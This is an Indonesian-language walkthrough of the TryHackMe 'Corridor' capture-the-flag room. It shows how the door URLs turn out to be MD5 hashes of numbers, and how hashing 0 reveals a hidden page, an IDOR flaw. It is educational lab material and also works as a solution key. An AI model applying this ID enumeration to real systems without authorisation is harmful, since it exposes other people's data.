# 🚪 TryHackMe Corridor CTF - Writeup

## **STEP 1: Deploy & Scan**
```bash
nmap -sV <IP_TARGET>
# Hasil: Port 80 (HTTP) terbuka
```

---

## **STEP 2: Akses Website**
```bash
http://<IP_TARGET>
```
Anda akan melihat koridor dengan beberapa pintu yang bisa diklik.

---

## **STEP 3: Inspeksi Source Code**
Tekan **F12** atau **Ctrl+U**, lihat URL dari setiap pintu:
```html
<a href="/c4ca4238a0b923820dcc509a6f75849b">Door 1</a>
<a href="/c81e728d9d4c2f636f067f89cc14862c">Door 2</a>
```

---

## **STEP 4: Decode Hash**
Gunakan CrackStation atau command line:
```bash
echo -n "1" | md5sum
# Output: c4ca4238a0b923820dcc509a6f75849b ✓

echo -n "2" | md5sum  
# Output: c81e728d9d4c2f636f067f89cc14862c ✓
```

**Pola Ditemukan**: Setiap pintu = MD5 hash dari angka (1-13)

---

## **STEP 5: Cari Door 0 (IDOR)**
Hint: "Find your way back to where you came?" → Door 0!

```bash
echo -n "0" | md5sum
# Output: cfcd208495d565ef66e7dff9f98764da
```

---

## **STEP 6: Akses Hidden Door**
```bash
http://<IP_TARGET>/cfcd208495d565ef66e7dff9f98764da
```

**🎉 FLAG DITEMUKAN!**

```
flag{...}
```

---

## **STEP 7: Submit Flag**
Copy flag ke TryHackMe → Submit ✅

---

## 🔑 Key Takeaway
**IDOR Vulnerability**: Aplikasi tidak validasi authorization, user bisa akses resource dengan mengubah predictable ID (MD5 hash).
